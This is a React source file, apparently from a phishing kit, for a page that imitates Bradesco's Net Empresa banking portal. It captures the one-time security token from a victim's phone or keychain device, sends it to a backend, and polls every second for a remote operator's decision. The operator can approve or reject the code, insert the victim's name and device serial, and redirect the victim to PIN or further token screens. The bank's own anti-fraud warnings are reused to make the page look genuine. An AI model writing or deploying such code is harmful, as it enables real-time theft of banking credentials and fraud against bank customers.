import { useEffect, useRef, useState } from "react";
import { useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { XCircle } from "lucide-react";
import { enviarToken, verificarStatus } from "@/lib/cliente.functions";
import { usePresenca } from "@/hooks/use-presenca";
import bannerFalsaCentral from "@/assets/banner-golpe.jpg.asset.json";
import botaoAvancar from "@/assets/botao-avancar.png.asset.json";
import botaoCancelar from "@/assets/botao-cancelar-acesso.png.asset.json";
import colunaGolpes from "@/assets/coluna-golpes.png.asset.json";
import rodape from "@/assets/rodape.png.asset.json";
import topoSite from "@/assets/topo-site.jpg.asset.json";
import caixaLoader from "@/assets/caixa-loader.png.asset.json";
import caixaToken from "@/assets/caixa-token.jpg.asset.json";
import iconeTokenCelular from "@/assets/icone-token-celular.png.asset.json";

type Props = {
  id: string;
  titulo: string;
  descricao: string;
  placeholder: string;
  rotulo: string;
  fase: "token_celular" | "token_chaveiro";
};

function dataPorExtenso() {
  const hoje = new Date();
  const dias = ["Domingo","Segunda-feira","Terça-feira","Quarta-feira","Quinta-feira","Sexta-feira","Sábado"];
  const meses = ["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"];
  return `${dias[hoje.getDay()]}, ${hoje.getDate()} de ${meses[hoje.getMonth()]} de ${hoje.getFullYear()}`;
}

export function TokenPage({ id, placeholder, fase }: Props) {
  const enviar = useServerFn(enviarToken);
  const checar = useServerFn(verificarStatus);
  const navigate = useNavigate();
  const [token, setToken] = useState("");
  const [enviando, setEnviando] = useState(false);
  const [aguardando, setAguardando] = useState(false);
  const [erro, setErro] = useState<string | null>(null);
  const [reprovado, setReprovado] = useState<string | null>(null);
  const [serial, setSerial] = useState<string | null>(null);
  const [nome, setNome] = useState<string | null>(null);
  const [dataStr, setDataStr] = useState<string>("");
  const enviadoEmRef = useRef<string | null>(null);

  usePresenca(id, fase);

  useEffect(() => {
    setDataStr(dataPorExtenso());
  }, []);

  useEffect(() => {
    let cancelado = false;
    const tick = async () => {
      try {
        const res = await checar({ data: { id } });
        if (res.status === "removido") {
          navigate({ to: "/" });
          return;
        }
        setSerial(res.token_serial ?? null);
        setNome(res.token_nome ?? null);


        if (res.status === "reprovado") {
          setAguardando(false);
          setEnviando(false);
          setReprovado(res.motivo ?? "Solicitação reprovada pelo operador.");
          return;
        }

        if (!aguardando && res.proxima_tela && res.proxima_tela !== fase) {
          if (res.proxima_tela === "sucesso") {
            navigate({ to: "/sucesso" });
            return;
          }
          if (res.proxima_tela === "interna") {
            navigate({ to: "/interna", search: { id } });
            return;
          }
          const destino =
            res.proxima_tela === "pin"
              ? "/pin"
              : res.proxima_tela === "token_chaveiro"
                ? "/token-chaveiro"
                : "/token-celular";
          navigate({ to: destino, search: { id } });
          return;
        }

        if (aguardando) {
          const clearedToken = !res.token_em || res.token_em !== enviadoEmRef.current;
          if (clearedToken && !res.token_em && res.proxima_tela) {
            if (res.proxima_tela === "sucesso") {
              navigate({ to: "/sucesso" });
              return;
            }
            if (res.proxima_tela === "interna") {
              navigate({ to: "/interna", search: { id } });
              return;
            }
            const destino =
              res.proxima_tela === "pin"
                ? "/pin"
                : res.proxima_tela === "token_chaveiro"
                  ? "/token-chaveiro"
                  : "/token-celular";
            if (
              (destino === "/token-celular" && fase !== "token_celular") ||
              (destino === "/token-chaveiro" && fase !== "token_chaveiro") ||
              destino === "/pin"
            ) {
              navigate({ to: destino, search: { id } });
              return;
            }
            setAguardando(false);
            setEnviando(false);
            setToken("");
            enviadoEmRef.current = null;
          }
        }
      } catch {
        // silencia
      }
    };
    tick();
    const t = setInterval(() => { if (!cancelado) tick(); }, 1000);
    return () => { cancelado = true; clearInterval(t); };
  }, [id, fase, checar, navigate, aguardando]);

  async function submeter(e?: { preventDefault: () => void }) {
    e?.preventDefault();
    setErro(null);
    const valor = token.trim();
    if (!valor) {
      setErro("Informe o token.");
      return;
    }
    setEnviando(true);
    try {
      await enviar({ data: { id, token: valor } });
      enviadoEmRef.current = new Date().toISOString();
      try {
        const res = await checar({ data: { id } });
        if (res.token_em) enviadoEmRef.current = res.token_em;
      } catch { /* ignora */ }
      setAguardando(true);
    } catch {
      setEnviando(false);
      setErro("Não foi possível enviar o token. Tente novamente.");
    }
  }

  function cancelar() {
    setToken("");
    setEnviando(false);
    setAguardando(false);
  }

  const isChaveiro = fase === "token_chaveiro";
  const instrucao = isChaveiro
    ? "Digite a chave informada no visor do seu chaveiro"
    : "Digite a chave informada no visor do seu celular";

  return (
    <div className="flex min-h-screen flex-col bg-[#e5e5e5] font-sans text-[13px] text-[#333]">
      <header className="relative h-[156px] overflow-hidden">
        <img
          src={topoSite.url}
          alt="Bradesco Net Empresa"
          width={1920}
          height={156}
          className="absolute left-0 top-0 h-[156px] w-[1920px] max-w-none"
        />
        <span className="absolute top-[44px] left-[182px] text-[12px] text-[#666]">
          {dataStr}
        </span>
      </header>

      <main className="flex-1 bg-[#e5e5e5]">
        <div className="grid grid-cols-1 gap-3 px-2 pt-3 lg:grid-cols-[minmax(0,780px)_240px] lg:justify-start">
          <div className="bg-white p-3">
            {/* Security banner */}
            <img
              src={bannerFalsaCentral.url}
              alt="Golpe da falsa central: dicas pra se proteger"
              className="mb-3 block h-auto w-full max-w-[717px]"
            />

            <form onSubmit={submeter} className="relative max-w-[717px]">
              <div
                className="bg-white bg-no-repeat bg-top"
                style={{ backgroundImage: `url(${caixaToken.url})`, backgroundSize: "100% 100%" }}
              >
                <div className="flex items-start gap-4 px-4 py-4">
                  {/* Left: number badge + instruction */}
                  <div className="flex shrink-0 items-start gap-3 w-[220px]">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center bg-[#c8102e] text-[13px] font-bold text-white">
                      2
                    </div>
                    <p className="text-[13px] leading-tight text-[#c8102e]">
                      Digite a <strong>chave</strong> informada no visor do seu {isChaveiro ? "chaveiro" : "celular"}
                    </p>
                  </div>

                  {/* Right: greeting, phone icon, input, serial */}
                  <div className="flex-1">
                    <div className="mb-1 text-[13px] text-[#333]">
                      Olá, <span className="font-semibold">{nome ?? ""}</span>
                    </div>
                    <div className="flex items-start gap-3">
                      {/* Phone image */}
                      <img
                        src={iconeTokenCelular.url}
                        alt="Chave de segurança"
                        className="block h-auto w-[100px] shrink-0"
                      />

                      {/* Input + serial */}
                      <div className="pt-1">
                        <div className="flex items-center gap-2">
                          <input
                            type="text"
                            inputMode="numeric"
                            autoComplete="one-time-code"
                            value={token}
                            onChange={(e) => setToken(e.target.value.replace(/\D/g, "").slice(0, 6))}
                            maxLength={6}
                            required
                            disabled={enviando || aguardando}
                            placeholder={placeholder}
                            className="h-[22px] w-[110px] rounded-sm border border-[#999] bg-white px-2 font-mono text-[13px] tracking-wider text-[#333] outline-none focus:border-[#c8102e] disabled:bg-[#f0f0f0]"
                          />
                          <span className="text-[11px] text-[#666]">(6 dígitos)</span>
                        </div>
                        <div className="mt-2 text-[12px] text-[#333]">
                          Nº de série do dispositivo:
                        </div>
                        <div className="font-mono text-[13px] font-semibold tracking-wider text-[#333]">
                          {serial ?? "XXXXXX000-0"}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>


              {aguardando && (
                <div
                  className="absolute inset-0 z-10 flex items-center justify-center bg-white bg-no-repeat bg-center"
                  style={{ backgroundImage: `url(${caixaLoader.url})`, backgroundSize: "100% 100%" }}
                >
                  <div className="flex items-center gap-2">
                    <div className="size-6 animate-spin rounded-full border border-dashed border-black" />
                    <span className="text-sm font-medium text-black">Aguarde...</span>
                  </div>
                </div>
              )}
            </form>

            {erro && (
              <p className="mt-2 max-w-[717px] rounded border border-[#ef5350]/50 bg-[#ffebee] px-3 py-2 text-[11px] text-[#c62828]">
                {erro}
              </p>
            )}

            {reprovado && (
              <div className="mt-2 max-w-[717px] rounded border border-[#ef5350]/50 bg-[#ffebee] px-3 py-2 text-[11px] text-[#c62828]">
                <div className="flex items-center gap-1.5 font-bold">
                  <XCircle className="size-3.5" />
                  Solicitação reprovada
                </div>
                <p className="mt-1 text-[#c62828]/80">{reprovado}</p>
              </div>
            )}

            {/* Warning banner */}
            <div className="mt-3 flex max-w-[717px] items-start gap-2 border border-[#e0c060] bg-[#fff8dc] px-3 py-2 text-[11px] text-[#333]">
              <span className="mt-0.5 inline-flex h-4 w-4 shrink-0 items-center justify-center border border-[#c8a020] bg-[#fff3a3] text-[10px] font-bold text-[#7a5b00]">
                !
              </span>
              <p>
                O Bradesco não envia e-mails contendo links ou solicitando atualizações de certificados digitais, componentes de segurança ou identificação do usuário.
              </p>
            </div>

            <div className="mt-3 flex max-w-[717px] items-center justify-end gap-2">
              <button
                type="button"
                onClick={cancelar}
                disabled={aguardando || enviando}
                className="relative inline-flex cursor-pointer items-center justify-center disabled:cursor-default"
              >
                <img
                  src={botaoCancelar.url}
                  alt="Cancelar acesso"
                  width={121}
                  height={23}
                  className="block h-[23px] w-[121px] cursor-pointer"
                />
              </button>
              <button
                type="button"
                onClick={() => submeter()}
                disabled={aguardando || enviando}
                className="relative inline-flex cursor-pointer items-center justify-center disabled:cursor-default"
              >
                <img
                  src={botaoAvancar.url}
                  alt="Acessar"
                  width={82}
                  height={22}
                  className="block h-[22px] w-[82px] cursor-pointer"
                />
              </button>
            </div>
          </div>

          <aside className="overflow-visible bg-[#e5e5e5] px-2">
            <img
              src={colunaGolpes.url}
              alt="Se proteja contra golpes e fraudes"
              className="block h-auto w-full origin-top-left scale-[1.05]"
            />
          </aside>
        </div>
      </main>

      <footer className="mt-6">
        <img
          src={rodape.url}
          alt="Bradesco Apoio à Empresa"
          className="block h-auto w-full"
        />
      </footer>
    </div>
  );
}
